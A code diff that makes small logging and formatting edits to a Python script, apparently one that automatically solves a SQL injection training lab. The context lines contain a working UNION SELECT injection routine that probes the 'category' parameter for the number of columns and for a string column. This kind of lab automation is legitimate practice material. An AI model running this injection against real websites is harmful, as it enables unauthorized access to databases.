@@ -47,7 +47,7 @@ def check_if_already_been_solved(url) :
         log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.YELLOW + " The Lab has already been solved !!" + "\n" + Fore.WHITE)
         sys.exit(0)
 
-def Get_string(url, no_proxy) :         # Retrieving the string that needs to be printed by the backend database
+def Get_string(url, no_proxy) :
     if (no_proxy) :
         resp = requests.get(url)
     else:
@@ -120,9 +120,9 @@ if __name__ == "__main__":
 
         if is_url_reachable(url):
 
-            check_if_already_been_solved(url)       # Check if the Lab has already been solved
+            check_if_already_been_solved(url)           # Checking if the Lab has already been solved
+            
             session = requests.Session()
-
             string = "'" + Get_string(url, args.no_proxy) + "'"
 
             log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing the GET parameter 'category'")
@@ -134,6 +134,7 @@ if __name__ == "__main__":
             columns = 1
             while True:
                 payload1 = "'+UNION+SELECT+" + "NULL,"*(columns-1) + "NULL--"       # Payload to find the number of columns returned by the query
+                
                 log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload1 + Fore.WHITE + " and sending ...")
                 Send_Payload(url, uri, session, payload1, args.no_proxy)
                 if check_response_code(url, uri, session, payload1, args.no_proxy) == 500:
@@ -150,6 +151,9 @@ if __name__ == "__main__":
                     break
 
             log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Searching for columns containing string data ...")
+            sleep(1)
+            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Retrieving the string provided in the Lab: " + Style.BRIGHT + Fore.CYAN + string)
+            
             for i in range(columns) :
                 null_count = columns -i -1
                 nulls = "NULL," * null_count
